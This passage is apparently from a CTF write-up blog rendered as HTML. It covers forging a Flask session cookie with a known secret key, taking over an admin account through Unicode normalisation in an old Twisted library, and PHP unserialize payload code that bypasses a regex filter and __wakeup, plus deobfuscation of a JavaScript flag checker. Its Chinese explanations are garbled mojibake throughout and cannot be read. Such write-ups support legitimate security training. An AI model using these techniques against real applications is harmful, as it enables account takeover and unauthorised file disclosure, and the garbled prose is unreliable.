b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><p>æ”¾å…¥å·¥å…· è®¾ç½®å¯†é’¥ åŠ å¯†</p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">python3 .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;ef01a11ab07dcfc5c410c3c49a740e9361325cb7bee207c6a22ce8f5040f22778ceccb6ea3be66a3662e2b1261ebeaf78033a0587a502a49632a0c9a5fc31118&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;7332f44b717815922ad60850c9ee93ea2aa3afaf&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;QgqS&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<span class="hljs-string">&quot; -s &quot;</span>ckj123<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJw<span class="hljs-number">9</span>kMFqwkAQhl-lz<span class="hljs-symbol">NlD3</span><span class="hljs-symbol">NiL4</span>KGStCQwk<span class="hljs-number">8</span>suw-xFrMYka<span class="hljs-number">2</span>IhKhtXfPduLXgahv_j<span class="hljs-number">45</span><span class="hljs-number">-5</span>w-Yw<span class="hljs-number">1</span>ucWlpfxWs<span class="hljs-number">9</span><span class="hljs-name">g0</span><span class="hljs-number">-1</span>heYe<span class="hljs-number">3</span>b<span class="hljs-number">1</span>iCZfHI-YT<span class="hljs-number">82</span>W<span class="hljs-name">G2</span>P<span class="hljs-number">4</span>qyjhgT<span class="hljs-number">1</span>GuHCpOK<span class="hljs-number">85</span>SydV_puG<span class="hljs-name">m8</span>EV<span class="hljs-symbol">NHquytLjwpVKKLmyizsM74</span>yA<span class="hljs-number">3</span>oipRC<span class="hljs-number">6</span>yyTE<span class="hljs-number">2</span>d<span class="hljs-number">70</span>dRZLZFDRa<span class="hljs-number">7</span>scSgmdDJZL<span class="hljs-symbol">nthSavsI6</span>DKPekmFW<span class="hljs-number">08</span>D<span class="hljs-symbol">nlSaQlxegl9</span>S<span class="hljs-number">2</span>wdhthP<span class="hljs-symbol">Nyt4</span>zGB<span class="hljs-number">3</span>Hg-by<span class="hljs-number">8</span>-xPr<span class="hljs-number">1</span>OoIARl<span class="hljs-number">4</span>S-ihT<span class="hljs-number">1</span>boHavKMrW<span class="hljs-number">5</span>uJrzLzp<span class="hljs-number">4</span>l<span class="hljs-number">1</span>j<span class="hljs-number">8</span>FyfhPO<span class="hljs-name">g7</span>Btbb<span class="hljs-symbol">N66</span>rph<span class="hljs-number">29</span>Qvk-H<span class="hljs-number">9</span>ZPx_ctoOMYC<span class="hljs-number">5</span>SmE<span class="hljs-name">G13</span><span class="hljs-name">M9</span>Pr<span class="hljs-number">8</span><span class="hljs-name">G8</span>wQevyIRbIY.YL<span class="hljs-number">7</span>RrA.ztSPmJ<span class="hljs-number">8</span>Wrg-xigAr_j<span class="hljs-number">3</span>XyEwrheY<br></code></pre></td></tr></table></figure><p>ç™»å½•åé¡µé¢åˆ·æ–°æŠ“åŒ… ä¿®æ”¹sessionæ”¾åŒ…</p><h3 id="æ–¹æ³•ä¸‰ã€Unicodeæ¬ºéª—"><a href="#æ–¹æ³•ä¸‰ã€Unicodeæ¬ºéª—" class="headerlink" title="æ–¹æ³•ä¸‰ã€Unicodeæ¬ºéª—"></a>æ–¹æ³•ä¸‰ã€Unicodeæ¬ºéª—</h3><p>æˆ‘ä»¬å†èšç„¦äºroutes.pyä¸Š åœ¨registerå’Œloginä»¥åŠchangeä¸‰ä¸ªæ¨¡å—ä¸Šå‡æœ‰strlower()å‡½æ•° è€Œè¿™ä¸ªå‡½æ•°ä¸æ˜¯pythonçš„è‡ªå¸¦å‡½æ•°lower()</p><p>æ‰¾ä¸€ä¸‹è¿™ä¸ªå‡½æ•°åŸå‹æˆ–è€…æœ‰æ²¡æœ‰å®šä¹‰</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><p>è°ƒç”¨äº†nodeprep.prepare()å‡½æ•° ç»§ç»­è·Ÿè¿› å‘ç°å¯¼å…¥äº†nodeprepæ¨¡å— ç»§ç»­è·Ÿè¿›å‘ç°è¿™æ˜¯æ¥è‡ªtwistedåº“</p><p>å†æ³¨æ„åˆ°requirements.txté‡Œé¢æè¿°äº†twistedçš„ç‰ˆæœ¬ <strong>Twisted==10.2.0</strong> å¯¹æ¯”å®˜ç½‘å‘ç°ç‰ˆæœ¬å·²ç»å¾ˆä½äº† å­˜åœ¨æœ‰Unicodeçš„æ¼æ´ è¿™ä¸ªç‚¹åªèƒ½è¯´å¤§å¤šæ•°æ—©æœŸå¼€å‘éƒ½éš¾å…æœ‰è¿™ä¸ªé—®é¢˜æˆ–é‚£ä¸ªé—®é¢˜ è€ŒUnicodeä½œä¸ºæ¯”è¾ƒé€šç”¨çš„ä¸œè¥¿ è‚¯å®šæ˜¯è¦æµ‹è¯•çš„ å½“ç„¶æœ‰ç›¸å…³çš„æ¼æ´æŠ¥å‘Šå¤ç°å‡ºæ¥æ›´å…·æœ‰è¯´æœåŠ› è€Œä¸æ˜¯åƒç¬”è€…åªèƒ½å¤ç°wp</p><p>åˆ°è¿™ä¸ªç½‘ç«™<a href="https://unicode-table.com/en/search/?q=Modifier+Letter+Capital">Search - Unicode Character Table (unicode-table.com)</a> æŒ‘é€‰å­—ç¬¦á´¬á´°á´¹á´µá´º</p><p>ç”¨è¿™ä¸ªå­—ç¬¦æ³¨å†Œ é‚£ä¹ˆæ­¤æ—¶å­˜å…¥æ•°æ®åº“çš„å°±åº”è¯¥æ˜¯å¤§å†™<strong>ADMIN</strong></p><p>é‚£æˆ‘ä»¬ç™»å½•ç”¨á´¬á´°á´¹á´µá´ºè¿˜æ˜¯<strong>ADMIN</strong>å‘¢</p><p>æ³¨æ„ ç™»å½•æ“ä½œä¹Ÿæœ‰ä¸€æ¬¡strlower() æ‰€ä»¥ä»ç„¶éœ€è¦æ˜¯è¦å‡å€¼á´¬á´°á´¹á´µá´º</p><p>ç„¶å æˆ‘ä»¬ç›®çš„æ˜¯ä¿®æ”¹æ‰adminçš„å¯†ç  ç„¶åä»¥adminç™»å½•</p><p>é‚£ä¹ˆå°±ç”¨change passwordåŠŸèƒ½ä¿®æ”¹å¯†ç  æ­¤æ—¶ä¿®æ”¹å¯†ç æ—¶ å†æ¬¡è§¦å‘strlower()</p><p>æ­¤æ—¶<strong>ADMIN</strong>å°±å˜æˆäº†amdinè¦†ç›–æ‰æ•°æ®åº“åŸæ¥çš„å€¼</p><p>å°±å¯ä»¥ä½¿ç”¨adminç™»å½•äº†</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124512198.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124515020.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124538163.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124723891.png"></p><p>ç™»å½•æˆåŠŸå’Œå›æ˜¾è¯æ˜á´¬á´°á´¹á´µá´ºè¢«è½¬ä¹‰ä¸º<strong>ADMIN</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124748298.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124805856.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124913625.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124926624.png"></p><h3 id="æ–¹æ³•å››ã€ä»£ç é€»è¾‘æ¼æ´"><a href="#æ–¹æ³•å››ã€ä»£ç é€»è¾‘æ¼æ´" class="headerlink" title="æ–¹æ³•å››ã€ä»£ç é€»è¾‘æ¼æ´"></a>æ–¹æ³•å››ã€ä»£ç é€»è¾‘æ¼æ´</h3><p>loginå‡½æ•°å’Œchangeå‡½æ•°éƒ½åœ¨æ²¡æœ‰å®Œå…¨checkèº«ä»½çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œäº†sessionæœ‰å…³çš„èµ‹å€¼</p><h2 id="æ”»é˜²ä¸–ç•ŒWeb-php-unserialize"><a href="#æ”»é˜²ä¸–ç•ŒWeb-php-unserialize" class="headerlink" title="æ”»é˜²ä¸–ç•ŒWeb_php_unserialize"></a>æ”»é˜²ä¸–ç•ŒWeb_php_unserialize</h2><p>è¿™é¢˜å…¶å®å¾ˆç®€å•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$var</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @unserialize(<span class="hljs-variable">$var</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-string">&quot;index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10è¡Œï¼šå®ä¾‹åŒ–Demoå¯¹è±¡fl4g.phpæ—¶ï¼Œ__wakeup()ä¼šé‡ç½®fileå˜é‡</p><p>19è¡Œï¼šåœ¨ä¸åŒºåˆ†å¤§å°å†™çš„æƒ…å†µä¸‹ ï¼Œ è‹¥å­—ç¬¦ä¸²å‡ºç° â€œo:æ•°å­—â€ æˆ–è€… â€œc:æ•°å­—â€™ è¿™æ ·çš„æ ¼å¼ ï¼Œ é‚£ä¹ˆå°±è¢«è¿‡æ»¤ã€‚</p><blockquote><p>preg_match()ä¸­<strong>i</strong>è¡¨ç¤ºä¸æ•æ„Ÿå¤§å°å†™ é‡Œé¢åŒ¹é…å­—ç¬¦å¯ä»¥**/â€”/<strong>å’Œ</strong>/bâ€”/b**(åªåŒ¹é…å•è¯)åŒ¹é…å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br>preg_match(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br><br><span class="hljs-comment">#ä»URLè·å–åŸŸå å†™æ³•ä¸€</span><br>preg_match(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<span class="hljs-string">&quot;http://www.php.net/index.html&quot;</span>, <span class="hljs-variable">$matches</span>)<span class="hljs-comment">//åŒ¹é…http://å’Œ/åˆ’åˆ†å¼€çš„ä¸‰éƒ¨åˆ†ä¿å­˜åˆ°æ•°ç»„</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">//æå–ä¸­é—´çš„éƒ¨åˆ† å³www.php.net</span><br>preg_match(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<span class="hljs-comment">//[^.]+ä¸­^åŒ¹é…ä¸€æ¬¡åŠä»¥ä¸Š [^.]+è¡¨ç¤ºä¸åŒ…å«.å­—ç¬¦çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ è¿›è¡ŒåŒ¹é…ä¸¤æ¬¡ å³å¾—åˆ°php net ä¸­é—´/. å³ç”¨.æ‹¼æ¥ å¾—åˆ°php.netè¦†ç›–åˆ°å˜é‡$matches</span><br><br><span class="hljs-comment">#URLè·å–åŸŸå å†™æ³•äºŒ</span><br>preg_match(â€˜/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">6</span>&#125;)([\/\w \.-]*)*\/?$/â€™ï¼‰<br></code></pre></td></tr></table></figure><p>å…¶ä»–å†…å®¹ å»ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹Perlçš„æ­£åˆ™åŒ¹é…</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Dmeo(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//o:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&quot;o:4&quot;</span>,<span class="hljs-string">&quot;o:+4&quot;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//ç»•è¿‡æ­£åˆ™åŒ¹é… å…·ä½“è§åšå®¢</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//ç»•è¿‡__wakeup() è¿™ä¸ªæ¼æ´è¯¦è§ååºåˆ—åŒ–æ¼æ´</span><br><span class="hljs-comment">//var_dump($a);</span><br>var_dump(base64_encode(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦è¯´çš„æ˜¯20ã€21è¡Œæ³¨é‡Šæ‰å¾—åˆ°çš„<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>æ‰‹åŠ¨ä¿®æ”¹å<code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>base64åŠ å¯†æ”¾åˆ°payloadä¸èƒ½æ‹¿åˆ°flag å¦‚ä¸‹å›¾</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/21/.png"></p><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œè¿™é‡Œçš„fileå˜é‡ä¸ºç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²å¼€å¤´ç»“å°¾å„æœ‰ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼ˆå³%00ï¼‰ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¹Ÿæ¯”å®é™…é•¿åº¦å¤§2ï¼Œå¦‚æœå°†åºåˆ—åŒ–ç»“æœå¤åˆ¶åˆ°åœ¨çº¿çš„base64ç½‘ç«™è¿›è¡Œç¼–ç å¯èƒ½å°±ä¼šä¸¢æ‰ç©ºç™½å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åœ¨phpä»£ç é‡Œè¿›è¡Œç¼–ç ã€‚ç±»ä¼¼çš„è¿˜æœ‰protectedç±»å‹çš„å˜é‡ï¼Œåºåˆ—åŒ–ä¹‹åå­—ç¬¦ä¸²é¦–éƒ¨ä¼šåŠ ä¸Š%00*%00ã€‚</p><h2 id="æ”»é˜²ä¸–ç•ŒNaNNaNNaNNaN-Batman"><a href="#æ”»é˜²ä¸–ç•ŒNaNNaNNaNNaN-Batman" class="headerlink" title="æ”»é˜²ä¸–ç•ŒNaNNaNNaNNaN-Batman"></a>æ”»é˜²ä¸–ç•ŒNaNNaNNaNNaN-Batman</h2><p>ä¸‹è½½é™„ä»¶ å¾—åˆ°æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script&gt;_=&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;[0]);.splice(0,1)&#125;&#125;&#125;\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;write(s[o%4]buttonif(e.ment&#x27;;for(Y in $=&#x27;&#x27;)with(_.split($[Y]))_=join(pop());eval(_)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¹±ç  å¯ä»¥ä½¿ç”¨Sublime Textå¤„ç†ä¸€ä¸‹</p><p>å°†ä¸Šé¢çš„ä»£ç æœ€åçš„evalå‡½æ•°æ¢ä¸ºalertåæ”¾åˆ°wwwæ‰“å¼€</p><p>å¾—åˆ°æºç </p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/23/.png"></p><p>å¤åˆ¶ä¸‹æ¥æ ¼å¼æ”¾åˆ°<a href="https://beautifier.io/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%8B">https://beautifier.io/å¤„ç†ä¸€ä¸‹</a> å¾—åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;be0f233ac7be98aa&#x27;</span>).value<br>  <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&#x27;fl&#x27;</span>, <span class="hljs-string">&#x27;s_a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;e&#125;&#x27;</span>]<br>            <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;_h0l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&#x27;g&#123;&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_0&#x27;</span>]<br>            <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> s = [t, n, r, i]<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>              <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>])<br>              s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>)<br><span class="hljs-keyword">delete</span> _<br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡çš„è¯ å°±è¦æ‡‚æ­£åˆ™è¡¨è¾¾å¼äº† ^è¡¨ç¤ºåŒ¹é…å¼€å¤´ $è¡¨ç¤ºåŒ¹é…æœ«å°¾</p><p>å¤šä¸ªifä¸‹æ¥å¾—åˆ°payload:<code>be0f23233ace98aa</code> æ”¾åˆ°è¾“å…¥æ¡†å¾—åˆ°flag ä½†æ˜¯æˆ‘æ²¡æœ‰æˆåŠŸ</p><p>æ”¾åˆ°æ§åˆ¶å°ä¹Ÿå°è¯•äº† åŸå› æœªæ˜</p><p>é‚£ä¹ˆå°±ç›´æ¥è·³è¿‡if å°†ä¸‹é¢ä»£ç æ”¾åˆ°æ§åˆ¶å°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];<br><span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];<br><span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> s = [t, n, r, i];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>    <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>    s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)ï¼›<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210623183118168.png"></p><h2 id="BUU-CODE-REVIEW"><a href="#BUU-CODE-REVIEW" class="headerlink" title="BUU CODE REVIEW"></a>BUU CODE REVIEW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span 